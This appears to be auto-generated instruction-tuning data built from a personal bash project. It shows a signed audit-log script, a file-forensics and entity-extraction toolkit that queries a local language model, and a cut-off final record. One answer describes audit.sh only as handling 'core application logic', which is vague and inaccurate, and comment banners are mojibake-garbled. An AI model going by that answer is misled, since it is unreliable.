{"instruction": "Show me the code for audit.sh which is part of the logs project.", "input": "", "output": "Here's the code for `pipeline\\logs\\audit.sh`:\n\n```sh\n#!/bin/bash\n# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n# â•‘  AUDIT LOG - Compliance para CÃ¡mara de Comercio               â•‘\n# â•‘  Logs auditables, firmados, exportables                       â•‘\n# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nLOG_DIR=\"$SCRIPT_DIR/data\"\nKEYS_DIR=\"/home/patricio/pipeline/keys\"\n\nmkdir -p \"$LOG_DIR\"\n\n# Archivo de log del dÃ­a\nTODAY=$(date +%Y-%m-%d)\nLOG_FILE=\"$LOG_DIR/audit_${TODAY}.jsonl\"\nINDEX_FILE=\"$LOG_DIR/index.json\"\n\n# Inicializar Ã­ndice si no existe\n[[ -f \"$INDEX_FILE\" ]] || echo '{\"logs\":[],\"total_entries\":0}' > \"$INDEX_FILE\"\n\n# Generar ID Ãºnico\ngen_id() {\n    echo \"TXN-$(date +%s)-$(head /dev/urandom | tr -dc 'a-f0-9' | head -c 8)\"\n}\n\n# Calcular hash de entrada\nhash_entry() {\n    echo -n \"$1\" | sha256sum | cut -d' ' -f1\n}\n\n# Firmar con clave privada (si existe)\nsign_entry() {\n    local data=\"$1\"\n    if [[ -f \"$KEYS_DIR/private.pem\" ]]; then\n        echo -n \"$data\" | openssl dgst -sha256 -sign \"$KEYS_DIR/private.pem\" | base64 -w0\n    else\n        echo \"unsigned\"\n    fi\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# LOG ENTRY\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nlog_entry() {\n    local action=\"$1\"\n    local details=\"$2\"\n    local source=\"${3:-system}\"\n    local status=\"${4:-success}\"\n\n    local id=$(gen_id)\n    local timestamp=$(date -Iseconds)\n    local hash=$(hash_entry \"${timestamp}${action}${details}\")\n\n    # Crear entrada JSON\n    local entry=$(cat <<EOF\n{\"id\":\"$id\",\"timestamp\":\"$timestamp\",\"action\":\"$action\",\"details\":\"$details\",\"source\":\"$source\",\"status\":\"$status\",\"hash\":\"$hash\"}\nEOF\n)\n\n    # Firmar entrada\n    local signature=$(sign_entry \"$entry\")\n\n    # Entrada final con firma\n    local signed_entry=$(echo \"$entry\" | jq -c \". + {\\\"signature\\\":\\\"$signature\\\"}\")\n\n    # Escribir al log\n    echo \"$signed_entry\" >> \"$LOG_FILE\"\n\n    # Actualizar Ã­ndice\n    local tmp=$(mktemp)\n    jq \".total_entries += 1 | .last_entry = \\\"$timestamp\\\"\" \"$INDEX_FILE\" > \"$tmp\" && mv \"$tmp\" \"$INDEX_FILE\"\n\n    echo \"$id\"\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# QUERY LOGS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nquery_logs() {\n    local filter=\"${1:-.}\"\n    local date=\"${2:-$TODAY}\"\n\n    local file=\"$LOG_DIR/audit_${date}.jsonl\"\n    [[ -f \"$file\" ]] && cat \"$file\" | jq -c \"$filter\" || echo \"No logs for $date\"\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# EXPORT (para CÃ¡mara de Comercio)\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nexport_logs() {\n    local format=\"${1:-json}\"\n    local date_from=\"${2:-$TODAY}\"\n    local date_to=\"${3:-$TODAY}\"\n    local output=\"$LOG_DIR/export_${date_from}_${date_to}\"\n\n    echo \"Exportando logs: $date_from â†’ $date_to\"\n\n    case \"$format\" in\n        json)\n            echo \"[\" > \"${output}.json\"\n            local first=true\n            for file in \"$LOG_DIR\"/audit_*.jsonl; do\n                [[ -f \"$file\" ]] || continue\n                while IFS= read -r line; do\n                    $first && first=false || echo \",\" >> \"${output}.json\"\n                    echo \"$line\" >> \"${output}.json\"\n                done < \"$file\"\n            done\n            echo \"]\" >> \"${output}.json\"\n            echo \"Exportado: ${output}.json\"\n            ;;\n        csv)\n            echo \"id,timestamp,action,details,source,status,hash\" > \"${output}.csv\"\n            for file in \"$LOG_DIR\"/audit_*.jsonl; do\n                [[ -f \"$file\" ]] || continue\n                cat \"$file\" | jq -r '[.id,.timestamp,.action,.details,.source,.status,.hash] | @csv' >> \"${output}.csv\"\n            done\n            echo \"Exportado: ${output}.csv\"\n            ;;\n    esac\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# VERIFY (integridad)\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nverify_logs() {\n    local date=\"${1:-$TODAY}\"\n    local file=\"$LOG_DIR/audit_${date}.jsonl\"\n\n    [[ -f \"$file\" ]] || { echo \"No logs for $date\"; return 1; }\n\n    echo \"Verificando integridad: $file\"\n    local errors=0\n    local total=0\n\n    while IFS= read -r line; do\n        ((total++))\n        local stored_hash=$(echo \"$line\" | jq -r '.hash')\n        local timestamp=$(echo \"$line\" | jq -r '.timestamp')\n        local action=$(echo \"$line\" | jq -r '.action')\n        local details=$(echo \"$line\" | jq -r '.details')\n        local computed_hash=$(hash_entry \"${timestamp}${action}${details}\")\n\n        if [[ \"$stored_hash\" != \"$computed_hash\" ]]; then\n            echo \"âŒ Entry $total: Hash mismatch\"\n            ((errors++))\n        fi\n    done < \"$file\"\n\n    if [[ $errors -eq 0 ]]; then\n        echo \"âœ… VerificaciÃ³n OK: $total entradas vÃ¡lidas\"\n    else\n        echo \"âš ï¸ $errors errores en $total entradas\"\n    fi\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# STATS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nstats() {\n    echo \"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\"\n    echo \"â•‘              AUDIT LOG STATISTICS                         â•‘\"\n    echo \"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo \"\"\n    echo \"  Log directory: $LOG_DIR\"\n    echo \"  Today's log:   $LOG_FILE\"\n    echo \"\"\n\n    local total_files=$(ls \"$LOG_DIR\"/audit_*.jsonl 2>/dev/null | wc -l)\n    local total_entries=$(cat \"$LOG_DIR\"/audit_*.jsonl 2>/dev/null | wc -l)\n\n    echo \"  Total log files: $total_files\"\n    echo \"  Total entries:   $total_entries\"\n    echo \"\"\n\n    if [[ -f \"$LOG_FILE\" ]]; then\n        local today_entries=$(wc -l < \"$LOG_FILE\")\n        echo \"  Today's entries: $today_entries\"\n    fi\n    echo \"\"\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# MAIN\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\ncase \"$1\" in\n    log)\n        log_entry \"$2\" \"$3\" \"$4\" \"$5\"\n        ;;\n    query)\n        query_logs \"$2\" \"$3\"\n        ;;\n    export)\n        export_logs \"$2\" \"$3\" \"$4\"\n        ;;\n    verify)\n        verify_logs \"$2\"\n        ;;\n    stats)\n        stats\n        ;;\n    tail)\n        tail -f \"$LOG_FILE\" | jq .\n        ;;\n    *)\n        echo \"AUDIT LOG - Compliance CÃ¡mara de Comercio\"\n        echo \"\"\n        echo \"  audit log <action> <details> [source] [status]\"\n        echo \"  audit query [filter] [date]\"\n        echo \"  audit export <json|csv> [from] [to]\"\n        echo \"  audit verify [date]\"\n        echo \"  audit stats\"\n        echo \"  audit tail\"\n        ;;\nesac\n\n```"}
{"instruction": "What does the file audit.sh do?", "input": "```sh\n#!/bin/bash\n# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n# â•‘  AUDIT LOG - Compliance para CÃ¡mara de Comercio               â•‘\n# â•‘  Logs auditables, firmados, exportables                       â•‘\n# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nLOG_DIR=\"$SCRIPT_DIR/data\"\nKEYS_DIR=\"/home/patricio/pipeline/keys\"\n\nmkdir -p \"$LOG_DIR\"\n\n# Archivo de log del dÃ­a\nTODAY=$(date +%Y-%m-%d)\nLOG_FILE=\"$LOG_DIR/audit_${TODAY}.jsonl\"\nINDEX_FILE=\"$LOG_DIR/index.json\"\n\n# Inicializar Ã­ndice si no existe\n[[ -f \"$INDEX_FILE\" ]] || echo '{\"logs\":[],\"total_entries\":0}' > \"$INDEX_FILE\"\n\n# Generar ID Ãºnico\ngen_id() {\n    echo \"TXN-$(date +%s)-$(head /dev/urandom | tr -dc 'a-f0-9' | head -c 8)\"\n}\n\n# Calcular hash de entrada\nhash_entry() {\n    echo -n \"$1\" | sha256sum | cut -d' ' -f1\n}\n\n# Firmar con clave privada (si existe)\nsign_entry() {\n    local data=\"$1\"\n    if [[ -f \"$KEYS_DIR/private.pem\" ]]; then\n        echo -n \"$data\" | openssl dgst -sha256 -sign \"$KEYS_DIR/private.pem\" | base64 -w0\n    else\n        echo \"unsigned\"\n    fi\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# LOG ENTRY\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nlog_entry() {\n    local action=\"$1\"\n    local details=\"$2\"\n    local source=\"${3:-system}\"\n    local status=\"${4:-success}\"\n\n    local id=$(gen_id)\n    local timestamp=$(date -Iseconds)\n    local hash=$(hash_entry \"${timestamp}${action}${details}\")\n\n    # Crear entrada JSON\n    local entry=$(cat <<EOF\n{\"id\":\"$id\",\"timestamp\":\"$timestamp\",\"action\":\"$action\",\"details\":\"$details\",\"source\":\"$source\",\"status\":\"$status\",\"hash\":\"$hash\"}\nEOF\n)\n\n    # Firmar entrada\n    local signature=$(sign_entry \"$entry\")\n\n    # Entrada final con firma\n    local signed_entry=$(echo \"$entry\" | jq -c \". + {\\\"signature\\\":\\\"$signature\\\"}\")\n\n    # Escribir al log\n    echo \"$signed_entry\" >> \"$LOG_FILE\"\n\n    # Actualizar Ã­ndice\n    local tmp=$(mktemp\n```", "output": "This file `audit.sh` is part of the logs project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for 4exe.sh which is part of the 4exe project.", "input": "", "output": "Here's the code for `pipeline\\corleone\\4exe\\4exe.sh`:\n\n```sh\n#!/bin/bash\n# â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n# â•‘  4EXE (FORENSIC) - Data Forensics & Analysis Toolkit          â•‘\n# â•‘  patru = 4 | exe = executable | 4ensic = forensic             â•‘\n# â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nset -e\n\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nCORLEONE_DIR=\"$(dirname \"$SCRIPT_DIR\")\"\nsource \"$CORLEONE_DIR/config.env\" 2>/dev/null || true\n\n# Config\nVERSION=\"1.0.0\"\nDATA_DIR=\"$SCRIPT_DIR/evidence\"\nREPORTS_DIR=\"$SCRIPT_DIR/reports\"\nLM_STUDIO_URL=\"${LM_STUDIO_URL:-http://192.168.192.2:1234/v1}\"\n\nmkdir -p \"$DATA_DIR\" \"$REPORTS_DIR\"\n\n# Colors\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nYELLOW='\\033[1;33m'\nCYAN='\\033[0;36m'\nMAGENTA='\\033[0;35m'\nWHITE='\\033[1;37m'\nNC='\\033[0m'\n\nbanner() {\n    echo -e \"${CYAN}\"\n    echo \"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\"\n    echo \"â•‘   â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—                            â•‘\"\n    echo \"â•‘   â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•                            â•‘\"\n    echo \"â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â•šâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—                              â•‘\"\n    echo \"â•‘   â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•   â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â•                              â•‘\"\n    echo \"â•‘        â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—                            â•‘\"\n    echo \"â•‘        â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•                            â•‘\"\n    echo \"â•‘                                                               â•‘\"\n    echo \"â•‘   4EXE FORENSIC - Data Analysis & Intelligence Toolkit        â•‘\"\n    echo \"â•‘   v$VERSION | patru=4 | exe=executable | 4ensic=forensic          â•‘\"\n    echo \"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\"\n    echo -e \"${NC}\"\n}\n\nlog() { echo -e \"${GREEN}[4EXE]${NC} $1\"; }\nwarn() { echo -e \"${YELLOW}[WARN]${NC} $1\"; }\nerr() { echo -e \"${RED}[ERROR]${NC} $1\"; }\ninfo() { echo -e \"${CYAN}[INFO]${NC} $1\"; }\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# FORENSIC ANALYSIS\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n# Analizar archivo/datos\nanalyze() {\n    local target=\"$1\"\n    local report_name=\"${2:-analysis_$(date +%Y%m%d_%H%M%S)}\"\n\n    if [[ -z \"$target\" ]]; then\n        err \"Uso: 4exe analyze <archivo|url|texto>\"\n        return 1\n    fi\n\n    log \"Iniciando anÃ¡lisis forense...\"\n\n    local report=\"$REPORTS_DIR/${report_name}.json\"\n\n    # Metadata\n    echo \"{\" > \"$report\"\n    echo \"  \\\"timestamp\\\": \\\"$(date -Iseconds)\\\",\" >> \"$report\"\n    echo \"  \\\"analyst\\\": \\\"4exe\\\",\" >> \"$report\"\n    echo \"  \\\"target\\\": \\\"$target\\\",\" >> \"$report\"\n\n    if [[ -f \"$target\" ]]; then\n        # AnÃ¡lisis de archivo\n        log \"Tipo: Archivo\"\n        local filetype=$(file -b \"$target\")\n        local size=$(stat -c%s \"$target\" 2>/dev/null || echo \"unknown\")\n        local hash=$(sha256sum \"$target\" 2>/dev/null | cut -d' ' -f1 || echo \"unknown\")\n\n        echo \"  \\\"type\\\": \\\"file\\\",\" >> \"$report\"\n        echo \"  \\\"filetype\\\": \\\"$filetype\\\",\" >> \"$report\"\n        echo \"  \\\"size_bytes\\\": $size,\" >> \"$report\"\n        echo \"  \\\"sha256\\\": \\\"$hash\\\",\" >> \"$report\"\n\n        # Extraer texto si es posible\n        if [[ \"$filetype\" == *\"text\"* ]] || [[ \"$filetype\" == *\"JSON\"* ]]; then\n            local content=$(cat \"$target\" | tr '\\n' ' ' | cut -c1-500)\n            echo \"  \\\"content_preview\\\": \\\"$content\\\",\" >> \"$report\"\n        fi\n    else\n        # AnÃ¡lisis de texto/URL\n        log \"Tipo: Texto/Data\"\n        echo \"  \\\"type\\\": \\\"text\\\",\" >> \"$report\"\n        echo \"  \\\"content\\\": \\\"$target\\\",\" >> \"$report\"\n    fi\n\n    echo \"  \\\"status\\\": \\\"complete\\\"\" >> \"$report\"\n    echo \"}\" >> \"$report\"\n\n    log \"Reporte guardado: $report\"\n    cat \"$report\" | python3 -m json.tool 2>/dev/null || cat \"$report\"\n}\n\n# Extraer entidades (emails, IPs, URLs, etc.)\nextract() {\n    local target=\"$1\"\n    local type=\"${2:-all}\"\n\n    if [[ -z \"$target\" ]]; then\n        err \"Uso: 4exe extract <archivo|texto> [emails|ips|urls|phones|all]\"\n        return 1\n    fi\n\n    log \"Extrayendo entidades ($type)...\"\n\n    local content\n    if [[ -f \"$target\" ]]; then\n        content=$(cat \"$target\")\n    else\n        content=\"$target\"\n    fi\n\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n    echo -e \"${CYAN}  EXTRACTED ENTITIES${NC}\"\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n\n    if [[ \"$type\" == \"all\" || \"$type\" == \"emails\" ]]; then\n        echo -e \"\\n${GREEN}[EMAILS]${NC}\"\n        echo \"$content\" | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' | sort -u || echo \"  (none)\"\n    fi\n\n    if [[ \"$type\" == \"all\" || \"$type\" == \"ips\" ]]; then\n        echo -e \"\\n${GREEN}[IP ADDRESSES]${NC}\"\n        echo \"$content\" | grep -oE '\\b([0-9]{1,3}\\.){3}[0-9]{1,3}\\b' | sort -u || echo \"  (none)\"\n    fi\n\n    if [[ \"$type\" == \"all\" || \"$type\" == \"urls\" ]]; then\n        echo -e \"\\n${GREEN}[URLS]${NC}\"\n        echo \"$content\" | grep -oE 'https?://[^ ]+' | sort -u || echo \"  (none)\"\n    fi\n\n    if [[ \"$type\" == \"all\" || \"$type\" == \"phones\" ]]; then\n        echo -e \"\\n${GREEN}[PHONE NUMBERS]${NC}\"\n        echo \"$content\" | grep -oE '[\\+]?[(]?[0-9]{1,3}[)]?[-\\s\\.]?[0-9]{3}[-\\s\\.]?[0-9]{4,6}' | sort -u || echo \"  (none)\"\n    fi\n\n    if [[ \"$type\" == \"all\" || \"$type\" == \"hashes\" ]]; then\n        echo -e \"\\n${GREEN}[HASHES (MD5/SHA)]${NC}\"\n        echo \"$content\" | grep -oE '\\b[a-fA-F0-9]{32,64}\\b' | sort -u || echo \"  (none)\"\n    fi\n\n    echo \"\"\n}\n\n# Analizar con IA (LM Studio)\nai_analyze() {\n    local target=\"$1\"\n    local query=\"${2:-Analiza estos datos y encuentra patrones sospechosos o interesantes}\"\n\n    log \"AnÃ¡lisis con IA...\"\n\n    local content\n    if [[ -f \"$target\" ]]; then\n        content=$(cat \"$target\" | head -c 2000)\n    else\n        content=\"$target\"\n    fi\n\n    local prompt=\"Eres un analista forense de datos experto. $query\n\nDatos a analizar:\n$content\n\nProporciona:\n1. Resumen de hallazgos\n2. Entidades importantes detectadas\n3. Patrones o anomalÃ­as\n4. Recomendaciones\"\n\n    local response=$(curl -s \"$LM_STUDIO_URL/chat/completions\" \\\n        -H \"Content-Type: application/json\" \\\n        -d \"{\n            \\\"model\\\": \\\"local-model\\\",\n            \\\"messages\\\": [{\\\"role\\\": \\\"user\\\", \\\"content\\\": $(echo \"$prompt\" | jq -Rs .)}],\n            \\\"temperature\\\": 0.3\n        }\" 2>/dev/null)\n\n    if [[ -n \"$response\" && \"$response\" != *\"error\"* ]]; then\n        echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n        echo -e \"${CYAN}  AI FORENSIC ANALYSIS${NC}\"\n        echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n        echo \"\"\n        echo \"$response\" | jq -r '.choices[0].message.content' 2>/dev/null || echo \"$response\"\n    else\n        warn \"LM Studio no disponible. Inicia el servidor en Windows (puerto 1234)\"\n    fi\n}\n\n# Timeline de eventos\ntimeline() {\n    local target=\"$1\"\n\n    log \"Generando timeline...\"\n\n    if [[ -f \"$target\" ]]; then\n        echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n        echo -e \"${CYAN}  FILE TIMELINE${NC}\"\n        echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n        echo \"\"\n        echo \"  Archivo:    $target\"\n        echo \"  Creado:     $(stat -c %w \"$target\" 2>/dev/null || echo \"N/A\")\"\n        echo \"  Modificado: $(stat -c %y \"$target\")\"\n        echo \"  Accedido:   $(stat -c %x \"$target\")\"\n        echo \"  Permisos:   $(stat -c %A \"$target\")\"\n        echo \"  Owner:      $(stat -c %U \"$target\")\"\n        echo \"\"\n    else\n        err \"Archivo no encontrado: $target\"\n    fi\n}\n\n# Hash de archivos\nhash_file() {\n    local target=\"$1\"\n\n    if [[ ! -f \"$target\" ]]; then\n        err \"Archivo no encontrado: $target\"\n        return 1\n    fi\n\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n    echo -e \"${CYAN}  FILE HASHES${NC}\"\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n    echo \"\"\n    echo \"  MD5:    $(md5sum \"$target\" | cut -d' ' -f1)\"\n    echo \"  SHA1:   $(sha1sum \"$target\" | cut -d' ' -f1)\"\n    echo \"  SHA256: $(sha256sum \"$target\" | cut -d' ' -f1)\"\n    echo \"\"\n}\n\n# Listar reportes\nreports() {\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n    echo -e \"${CYAN}  FORENSIC REPORTS${NC}\"\n    echo -e \"${CYAN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}\"\n    echo \"\"\n    ls -la \"$REPORTS_DIR\"/*.json 2>/dev/null || echo \"  (no reports yet)\"\n    echo \"\"\n}\n\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n# SOCIAL MEDIA FORENSICS (Instagram @patru integration)\n# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\nsocial_analyze() {\n    local platform=\"$1\"\n    local username=\"$2\"\n\n    log \"AnÃ¡lisis de redes sociales: @$username ($platform)\"\n\n    # Placeholder - aquÃ­ se integrarÃ­a con APIs de Instagram/LinkedIn\n    info \"Para anÃ¡lisis completo, exporta datos desde:\"\n    echo \"  Instagram: Settings > Your Activity > Download Your Information\"\n    echo \"  LinkedIn:  Settings > Get a copy of your data\"\n    echo \"\"\n    echo \"Luego: 4exe analyze <archivo_exportado.json>\"\n}\n\n# 